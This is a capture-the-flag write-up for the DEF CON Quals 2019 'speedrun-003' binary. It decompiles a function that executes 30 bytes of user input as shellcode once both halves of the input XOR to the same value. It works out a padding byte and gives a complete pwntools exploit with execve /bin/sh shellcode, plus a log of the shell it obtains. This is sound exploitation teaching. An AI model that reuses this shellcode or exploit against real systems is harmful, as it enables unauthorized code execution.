# Defcon Quals 2019 Speedrun---03

First let's take a look at the binary:
```
$    pwn checksec speedrun
[*] '/Hackery/defcon/s3/speedrun'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
$    file speedrun
speedrun: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/l, for GNU/Linux 3.2.0, BuildID[sha1]=6169e4b9b9e1600c79683474c0488c8319fc90cb, not stripped
$    ./speedrun
Think you can drift?
Send me your drift
19535728
You're not ready.
```

So we can see that it has all of the standard binary mitiations, and that it is a 64 bit elf that prompts us for input. When we look at the main function in Ghidra, we see this:

```
undefined8 main(void)

{
  char *pcVar1;
 
  setvbuf(stdout,(char *)0x0,2,0);
  pcVar1 = getenv("DEBUG");
  if (pcVar1 == (char *)0x0) {
    alarm(5);
  }
  say_hello();
  get_that_shellcode();
  return 0;
}
```

Looking through the functions, the one of interest to us is `get_that_shellcode()`:

```
void get_that_shellcode(void)

{
  char xor0;
  char xor1;
  ssize_t bytesRead;
  size_t len;
  char *nopCheck;
  long in_FS_OFFSET;
  char input [15];
  undefined auStack41 [15];
  undefined local_1a;
  long stackCanary;
 
  stackCanary = *(long *)(in_FS_OFFSET + 0x28);
  puts("Send me your drift");
  bytesRead = read(0,input,0x1e);
  local_1a = 0;
  if ((int)bytesRead == 0x1e) {
    len = strlen(input);
    if (len == 0x1e) {
      nopCheck = strchr(input,0x90);
      if (nopCheck == (char *)0x0) {
        xor0 = xor(input,0xf);
        xor1 = xor(auStack41,0xf);
        if (xor0 == xor1) {
          shellcode_it(input,0x1e);
        }
        else {
          puts("This is a special race, come back with better.");
        }
      }
      else {
        puts("Sleeping on the job, you\'re not ready.");
      }
    }
    else {
      puts("You\'re not up to regulation.");
    }
  }
  else {
    puts("You\'re not ready.");
  }
  if (stackCanary != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return;
}
```

Here we can see it scans in `0x1e` bytes worth of input into `buf`, which then `strlen` is called on it. If the output of strlen is `30` then we can proceed. It also checks for NOPS (opcode `0x90`) in our input with `strchr`. Then runs the first half and second half of our input through the `xor` function, and checks to see if the results are the same. The `xor` function just goes through and xors the first `x` number of bytes it has been given, where `x` is the second argument and returns the output as a single byte:

```
ulong xor(long lParm1,uint uParm2)

{
  byte x;
  uint i;
 
  x = 0;
  i = 0;
  while (i < uParm2) {
    x = x ^ *(byte *)(lParm1 + (ulong)i);
    i = i + 1;
  }
  return (ulong)x;
}
```

So in order for our shellcode to run, the first half of our shellcode when all the bytes are xored together must be equal to the second half of the shellcode xored together. Then if it passes that check, our input is ran as shellcode in the `shellcode_it` function:

```
void shellcode_it(void *pvParm1,uint uParm2)

{
  undefined *shellcode;
 
  shellcode = (undefined *)mmap((void *)0x0,(ulong)uParm2,7,0x22,-1,0);
  memcpy(shellcode,pvParm1,(ulong)uParm2);
  (*(code *)shellcode)();
  return;
}
```

So in order to get a shell, we will just need to send it a `30` byte shellcode with no null bytes (because that would interfere with the `strlen` call), and the first half of the shellcode xored together will be equal to the second half of the shellcode xored together. For this I used a 24 byte shellcode that I have used previously (the one from: https://teamrocketist.github.io/2017/09/18/Pwn-CSAW-Pilot/ ), while padding the end with `6` bytes worth of data to pass the length check. I then edited the last byte to pass the xor check by doing some simple xor math. Also I didn't have to worry too much about what instructions the opcodes mapped to, since the would be executed after the syscall which is when we get the shell.

To figure out what specific byte at the end, we can do that with a bit of python math. First xor the first part by itself to figure out what we need to get the right side equal to:

```
>>> part0 = "\x31\xf6\x48\xbf\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdf"
>>> len(part0)
15
>>> x = 0
>>> for i in part0:
...     x = x ^ ord(i)
...
>>> hex(x)
'0x2f'
>>>
```

So we can see that the xor must equal `0x2f`. Let's see what the other half of the xor will be if we append 4 `\x50`s to the end:

```
>>> part1 = "\xf7\xe6\x04\x3b\x57\x54\x5f\x0f\x05"
>>> part1 += "\x50"*5
>>> len(part1)
14
>>> x = 0
>>> for i in part1:
...     x = x ^ ord(i)
...
>>> hex(x)
'0x28'
```

To figure out what the missing byte is, we can just xor `0x28` and `0x2f` together:

```
>>> 0x28 ^ 0x2f
7
```

With that, we can see that the final byte of the second part will need to be `7` to pass the checks. Putting it all together, we get the following exploit:

```
from pwn import *

# Establish the target process
target = process('./speedrun-003')
#gdb.attach(target, gdbscript = 'pie b *0xac7')
#gdb.attach(target, gdbscript = 'pie b *0xaa3')
#gdb.attach(target, gdbscript = 'pie b *0x982')
#gdb.attach(target, gdbscript = 'pie b *0x9f7')

# The main portion of the shellcode
shellcode = "\x31\xf6\x48\xbf\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdf\xf7\xe6\x04\x3b\x57\x54\x5f\x0f\x05"


# Pad the shellcode to meet the length / xor requirements
#shellcode = "\x50"*3 + shellcode + "\x50"*2 + "\x07"
shellcode = shellcode + "\x50"*5 + "\x07"

# Send the shellcode and then drop to an interactive shell
target.send(shellcode)
target.interactive()
```

When we run it:
```
$ python exploit.py
[+] Starting local process './speedrun-003': pid 5605
[*] Switching to interactive mode
Think you can drift?
Send me your drift
$ w
 00:58:37 up 21 min,  1 user,  load average: 0.39, 0.62, 0.57
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
guyinatu :0       :0               00:40   ?xdm?   1:32   0.00s /usr/lib/gdm3/gdm-x-session --run-script env GNOME_SHELL_SESSION_MODE=ubuntu gnome-session --session=ubuntu
$ ls
exploit.py  readme.md  speedrun-003
```

Just like that, we solved the challenge!